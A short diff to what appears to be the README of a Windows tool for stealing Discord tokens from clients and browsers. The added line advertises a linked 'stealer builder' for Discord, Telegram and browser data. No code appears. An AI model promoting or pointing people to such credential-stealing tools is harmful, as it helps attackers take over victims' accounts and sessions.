@@ -2,6 +2,8 @@
 
 Steal Discord tokens from clients and browsers.
 
+**Check [Waifu Stealer](https://github.com/rigwild/waifu-stealer) (Stealer builder: Discord, Telegram, Browsers, ...)**
+
 **Note:** This only works on Windows.
 
 ## Features
